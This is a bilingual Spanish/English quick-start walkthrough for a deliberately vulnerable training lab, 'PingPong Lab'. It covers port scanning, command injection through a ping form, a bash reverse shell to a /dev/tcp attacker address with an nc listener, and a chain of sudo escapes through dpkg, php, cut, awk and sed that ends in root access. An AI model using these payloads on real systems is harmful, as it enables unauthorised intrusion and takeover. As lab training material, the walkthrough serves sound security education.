# QuickStart - PingPong Lab

---

## 🚀 Inicio Rápido (Español)

### Paso 1: Reconocimiento
```bash
nmap -p- <target_ip>
```
Identifica puertos abiertos: 80, 443, 5000 (todos HTTP)

### Paso 2: Explotación Initial - Inyección de Comandos
- Accede a `http://<target_ip>:5000`
- En el formulario de ping, ingresa: `8.8.8.8; id`
- El punto y coma permite ejecutar comandos adicionales

### Paso 3: Shell Reversa
En tu máquina atacante, abre listener:
```bash
nc -lnvp 4444
```

Envía este comando en el formulario ping:
```bash
172.17.0.1; /bin/bash -c "/bin/bash -i >& /dev/tcp/<tu_ip>/4444 0>&1"
```

### Paso 4: Estabilizar Shell
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

### Paso 5: Escalada Encadenada
```bash
# 1. freddy -> bobby (dpkg)
sudo -u bobby dpkg -l
# Dentro del pager: !/bin/bash

# 2. bobby -> gladys (php)
sudo -u gladys php -r 'system("/bin/bash -i");'

# 3. gladys -> chocolatito (cut)
sudo -u chocolatito cut -d: -f1 /opt/archivo_con_passwd
# Obtén la contraseña y cambia de usuario

# 4. chocolatito -> theboss (awk)
sudo -u theboss awk 'BEGIN {system("/bin/bash -i")}'

# 5. theboss -> root (sed)
sudo -u root sed -ne '1e /bin/bash -i' /etc/hostname
```

### Paso 6: Confirmar acceso root
```bash
id
```

---

## 🚀 Quick Start (English)

### Step 1: Reconnaissance
```bash
nmap -p- <target_ip>
```
Identifies open ports: 80, 443, 5000 (all HTTP)

### Step 2: Initial Exploitation - Command Injection
- Access `http://<target_ip>:5000`
- In the ping form, enter: `8.8.8.8; id`
- The semicolon allows execution of additional commands

### Step 3: Reverse Shell
On your attacker machine, open listener:
```bash
nc -lnvp 4444
```

Send this command in the ping form:
```bash
172.17.0.1; /bin/bash -c "/bin/bash -i >& /dev/tcp/<your_ip>/4444 0>&1"
```

### Step 4: Stabilize Shell
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

### Step 5: Chained Escalation
```bash
# 1. freddy -> bobby (dpkg)
sudo -u bobby dpkg -l
# Inside pager: !/bin/bash

# 2. bobby -> gladys (php)
sudo -u gladys php -r 'system("/bin/bash -i");'

# 3. gladys -> chocolatito (cut)
sudo -u chocolatito cut -d: -f1 /opt/password_file
# Obtain password and switch user

# 4. chocolatito -> theboss (awk)
sudo -u theboss awk 'BEGIN {system("/bin/bash -i")}'

# 5. theboss -> root (sed)
sudo -u root sed -ne '1e /bin/bash -i' /etc/hostname
```

### Step 6: Confirm root access
```bash
id
```

---

## 📌 Key Points / Puntos Clave

| Aspecto | Español | English |
|--------|---------|---------|
| **Vulnerabilidad Principal** | Inyección de Comandos | Command Injection |
| **Servicio Vulnerable** | Ping en Puerto 5000 | Ping Service on Port 5000 |
| **Método de Escalada** | Binarios explotables con sudo | Exploitable Binaries with sudo |
| **Objetivo Final** | Acceso como root | Root Access |
| **Tiempo Estimado** | 15-20 minutos | 15-20 minutes |

